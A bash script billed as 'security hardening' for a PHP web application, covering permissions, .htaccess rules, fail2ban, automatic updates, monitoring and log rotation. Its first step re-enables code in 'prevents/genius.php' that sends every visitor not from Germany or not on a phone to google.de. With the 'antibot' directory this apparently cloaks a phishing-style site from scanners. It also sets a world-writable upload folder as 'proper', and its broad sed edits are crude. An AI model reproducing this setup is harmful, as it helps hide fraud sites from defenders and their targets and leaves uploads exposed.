#!/bin/bash

# Security Hardening Script for PHP Application
# Run this script after deployment

set -e

echo "🔒 Starting Security Hardening..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    print_error "Please run this script as root or with sudo"
    exit 1
fi

# Step 1: Re-enable security restrictions
print_status "Re-enabling application security restrictions..."
if [ -f "/var/www/html/comm/prevents/genius.php" ]; then
    # Backup original file
    cp /var/www/html/comm/prevents/genius.php /var/www/html/comm/prevents/genius.php.backup
    
    # Re-enable geographic restriction
    sed -i 's|// if (!\$geo_info || \$geo_info\['\''status'\''\] !== '\''success'\'' || \$geo_info\['\''countryCode'\''\] !== '\''DE'\'') {|if (!\$geo_info || \$geo_info\['\''status'\''\] !== '\''success'\'' || \$geo_info\['\''countryCode'\''\] !== '\''DE'\'') {|' /var/www/html/comm/prevents/genius.php
    sed -i 's|//     header("Location: https://google.de");|    header("Location: https://google.de");|' /var/www/html/comm/prevents/genius.php
    sed -i 's|//     exit();|    exit();|' /var/www/html/comm/prevents/genius.php
    sed -i 's|// }|}|' /var/www/html/comm/prevents/genius.php
    
    # Re-enable mobile device restriction
    sed -i 's|// if (!preg_match('\''/android|iphone/i'\'', \$user_agent)) {|if (!preg_match('\''/android|iphone/i'\'', \$user_agent)) {|' /var/www/html/comm/prevents/genius.php
    sed -i 's|//     header("Location: https://google.de");|    header("Location: https://google.de");|' /var/www/html/comm/prevents/genius.php
    sed -i 's|//     exit();|    exit();|' /var/www/html/comm/prevents/genius.php
    sed -i 's|// }|}|' /var/www/html/comm/prevents/genius.php
    
    print_status "Security restrictions re-enabled"
else
    print_warning "genius.php not found, skipping security restriction re-enabling"
fi

# Step 2: Set proper file permissions
print_status "Setting secure file permissions..."
chown -R www-data:www-data /var/www/html/comm
chmod -R 755 /var/www/html/comm
chmod -R 777 /var/www/html/comm/views/xentryxupload/
chmod 600 /var/www/html/comm/config/index.php

# Step 3: Create .htaccess for additional security (Apache only)
if [ -f "/etc/apache2/apache2.conf" ]; then
    print_status "Creating .htaccess security rules..."
    cat > /var/www/html/comm/.htaccess << 'EOF'
# Security headers
<IfModule mod_headers.c>
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "no-referrer-when-downgrade"
</IfModule>

# Deny access to sensitive files
<FilesMatch "\.(bak|backup|old|tmp|temp|log|ini|conf|sql)$">
    Require all denied
</FilesMatch>

<FilesMatch "^\.">
    Require all denied
</FilesMatch>

# Deny access to sensitive directories
RedirectMatch 403 ^/config/
RedirectMatch 403 ^/antibot/
RedirectMatch 403 ^/prevents/

# Prevent directory browsing
Options -Indexes

# Disable server signature
ServerSignature Off
EOF
fi

# Step 4: Configure fail2ban for additional security
print_status "Installing and configuring fail2ban..."
apt install -y fail2ban

# Create fail2ban configuration
cat > /etc/fail2ban/jail.local << 'EOF'
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3

[sshd]
enabled = true
port = ssh
logpath = /var/log/auth.log

[nginx-http-auth]
enabled = true
filter = nginx-http-auth
logpath = /var/log/nginx/error.log

[apache-auth]
enabled = true
filter = apache-auth
logpath = /var/log/apache2/error.log

[php-url-fopen]
enabled = true
filter = php-url-fopen
logpath = /var/log/apache2/error.log
EOF

systemctl enable fail2ban
systemctl start fail2ban

# Step 5: Configure automatic security updates
print_status "Configuring automatic security updates..."
apt install -y unattended-upgrades

cat > /etc/apt/apt.conf.d/50unattended-upgrades << 'EOF'
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}-security";
    "${distro_id}ESMApps:${distro_codename}-apps-security";
    "${distro_id}ESM:${distro_codename}-infra-security";
};

Unattended-Upgrade::AutoFixInterruptedDpkg "true";
Unattended-Upgrade::MinimalSteps "true";
Unattended-Upgrade::Remove-Unused-Dependencies "true";
Unattended-Upgrade::Automatic-Reboot "false";
EOF

cat > /etc/apt/apt.conf.d/20auto-upgrades << 'EOF'
APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";
APT::Periodic::AutocleanInterval "7";
EOF

# Step 6: Create monitoring script
print_status "Creating monitoring script..."
cat > /usr/local/bin/monitor-comm.sh << 'EOF'
#!/bin/bash

# Application monitoring script
LOG_FILE="/var/log/comm-monitor.log"
DATE=$(date '+%Y-%m-%d %H:%M:%S')

# Check if services are running
if systemctl is-active --quiet nginx; then
    echo "[$DATE] Nginx: OK" >> $LOG_FILE
else
    echo "[$DATE] Nginx: FAILED" >> $LOG_FILE
    systemctl restart nginx
fi

if systemctl is-active --quiet apache2; then
    echo "[$DATE] Apache: OK" >> $LOG_FILE
else
    echo "[$DATE] Apache: FAILED" >> $LOG_FILE
    systemctl restart apache2
fi

if systemctl is-active --quiet php8.1-fpm; then
    echo "[$DATE] PHP-FPM: OK" >> $LOG_FILE
else
    echo "[$DATE] PHP-FPM: FAILED" >> $LOG_FILE
    systemctl restart php8.1-fpm
fi

# Check disk space
DISK_USAGE=$(df /var/www/html | tail -1 | awk '{print $5}' | sed 's/%//')
if [ $DISK_USAGE -gt 80 ]; then
    echo "[$DATE] WARNING: Disk usage is ${DISK_USAGE}%" >> $LOG_FILE
fi

# Check for suspicious activity in logs
if [ -f "/var/log/nginx/comm_error.log" ]; then
    SUSPICIOUS=$(grep -c "404\|403\|500" /var/log/nginx/comm_error.log | tail -1)
    if [ $SUSPICIOUS -gt 100 ]; then
        echo "[$DATE] WARNING: High number of errors in Nginx logs" >> $LOG_FILE
    fi
fi

# Keep only last 30 days of logs
find /var/log -name "comm-monitor.log" -mtime +30 -delete
EOF

chmod +x /usr/local/bin/monitor-comm.sh

# Add to crontab for monitoring every 5 minutes
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/local/bin/monitor-comm.sh") | crontab -

# Step 7: Create log rotation configuration
print_status "Configuring log rotation..."
cat > /etc/logrotate.d/comm << 'EOF'
/var/log/nginx/comm_*.log {
    daily
    missingok
    rotate 30
    compress
    delaycompress
    notifempty
    create 644 www-data www-data
    postrotate
        systemctl reload nginx
    endscript
}

/var/log/apache2/comm_*.log {
    daily
    missingok
    rotate 30
    compress
    delaycompress
    notifempty
    create 644 www-data www-data
    postrotate
        systemctl reload apache2
    endscript
}
EOF

# Step 8: Final security checks
print_status "Performing final security checks..."

# Check if sensitive files are protected
if [ -f "/var/www/html/comm/config/index.php" ]; then
    PERMS=$(stat -c %a /var/www/html/comm/config/index.php)
    if [ "$PERMS" != "600" ]; then
        chmod 600 /var/www/html/comm/config/index.php
        print_status "Fixed config file permissions"
    fi
fi

# Check if upload directory has proper permissions
if [ -d "/var/www/html/comm/views/xentryxupload" ]; then
    PERMS=$(stat -c %a /var/www/html/comm/views/xentryxupload)
    if [ "$PERMS" != "777" ]; then
        chmod 777 /var/www/html/comm/views/xentryxupload
        print_status "Fixed upload directory permissions"
    fi
fi

print_status "✅ Security hardening completed!"
print_warning "📝 Security recommendations:"
print_warning "1. Regularly update your system: apt update && apt upgrade"
print_warning "2. Monitor logs: tail -f /var/log/comm-monitor.log"
print_warning "3. Check fail2ban status: fail2ban-client status"
print_warning "4. Review application logs regularly"
print_warning "5. Consider using a Web Application Firewall (WAF)"
print_warning "6. Implement regular security audits"

echo ""
print_status "🔒 Security hardening script completed!"
